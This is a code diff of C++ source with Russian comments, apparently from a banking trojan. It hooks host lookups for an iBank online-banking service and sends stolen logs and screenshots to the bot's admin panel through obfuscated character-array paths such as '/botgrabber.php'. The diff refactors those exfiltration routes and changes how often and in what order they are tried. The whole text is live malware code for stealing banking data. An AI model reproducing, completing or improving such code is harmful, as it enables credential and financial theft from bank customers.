@@ -46,10 +46,10 @@ namespace IBANKDEBUGSTRINGS
 
 
 #ifdef JavaConfigH
-	char IBankLogPath[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
-#else
-	char IBankLogPath[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
+	char IBankLogPathJavaHost[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
 #endif
+
+	char IBankLogPathMainHost[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
 
 
 
@@ -178,10 +178,10 @@ namespace IBank
 
 		// В случае если получается имя хоста ибанка, сохраняем его
 		// для дальнейших проверок
-		if (Res && !IsJavaHost(name))
+		if (Res && !IsJavaHost(name) && !IsMainHost(name))
 		{
 			IBnakHostAddr = *(LPDWORD)Res->h_addr_list[0];
-			IBDBG("IBankW", ">>>>>>>>>>>>>>>> Отреагировали на хост %s", name);
+			IBDBG("IBankW", ">>>>>>> Отреагировали на хост %s", name);
         }
 
 		return Res;
@@ -464,10 +464,10 @@ namespace IBank
 
 		#ifdef JavaConfigH
 			if (!UseMainHosts)
-				return GetJavaScriptURL(IBankLogPath);
+				return GetJavaScriptURL(IBankLogPathJavaHost);
 		#endif
 
-		return GetBotScriptURL(0, IBankLogPath);
+		return GetBotScriptURL(0, IBankLogPathMainHost);
     }
 
 	//-----------------------------------------------------------------------
@@ -476,13 +476,17 @@ namespace IBank
 	{
 		// Функция отправляет данные на необъодимую админку
 		// UseMainHosts - Указание отправлять лог на основную админку
+		if (UseMainHosts)
+			IBDBG("IBank", "Отправляем лог на основную админку бота");
+
 		for (int i = 1; i <= 10; i++)
 		{
 			PCHAR URL = GetIBankURL(UseMainHosts);
 
+
 		    IBDBG("IBank", "Отправляем лог. (Попытка %d) URL - %s", i, URL);
 
-			if (URL != NULL)
+			if (URL)
 			{
 				bool Sended = SendLog(URL, L);
 
@@ -490,7 +494,6 @@ namespace IBank
 				if (Sended)
 				{
 					IBDBG("IBank", "Лог успешно отправлен");
-					STR::Free(URL);
 					break;
 				}
 			}
@@ -510,8 +513,6 @@ namespace IBank
 		if (!L)
 			return 0;
 
-		// Отправляем лог на основную админку бота
-		SendLogToAdmin(L, true);
 
 		#ifdef JavaConfigH
 			// Если включен модуль ява хостов то, отправляем
@@ -519,7 +520,10 @@ namespace IBank
 			SendLogToAdmin(L, false);
 		#endif
 
-        // Уничтожаем данные
+		// Отправляем лог на основную админку бота
+		SendLogToAdmin(L, true);
+
+		// Уничтожаем данные
 		MemFree(L->EndScreenShot.Data);
 		STR::Free(L->LogFile);
 		STR::Free(L->Log);
